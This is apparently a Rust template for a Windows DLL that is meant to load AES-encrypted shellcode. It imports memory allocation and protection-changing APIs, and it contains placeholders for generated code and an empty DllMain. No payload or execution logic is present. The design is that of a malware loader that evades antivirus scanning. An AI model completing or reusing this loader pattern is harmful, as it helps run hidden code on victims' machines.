use windows::Win32::{Foundation::{HANDLE, HMODULE}, System::{Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}, Threading::WaitForSingleObject}};
use std::thread;
use std::ptr;
use aes_gcm::{
    aead::{Aead, KeyInit}, Aes256Gcm, Key
};

pub mod shellcode;


{}


{SHELLCODE_STUB}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(h_module: HMODULE, call_reason: u32, _: *mut ()) -> bool {
    if call_reason == 1 {
    }

    true
}